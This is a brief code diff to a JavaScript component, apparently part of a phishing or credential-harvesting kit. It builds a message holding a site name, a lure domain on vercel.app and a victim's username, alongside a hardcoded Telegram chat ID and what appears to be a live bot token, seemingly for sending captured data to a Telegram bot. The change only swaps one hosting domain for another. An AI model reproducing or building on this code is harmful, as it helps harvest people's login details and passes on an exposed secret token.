@@ -18,7 +18,7 @@ const Message = () => {
       setError('');
     }
 
-    const text = `%0A 🔐 Site Name: ${sitename}sessiya-three.vercel.app %0A 👦 Username: ${username}   `;
+    const text = `%0A 🔐 Site Name: ${sitename} reach2.vercel.app/ %0A 👦 Username: ${username}   `;
     const chatId = -1002128588085;
     const token = '6834109969:AAEhUkHL4MsMs8Be2CWGY9oC7KXSbW8JHAM';
     
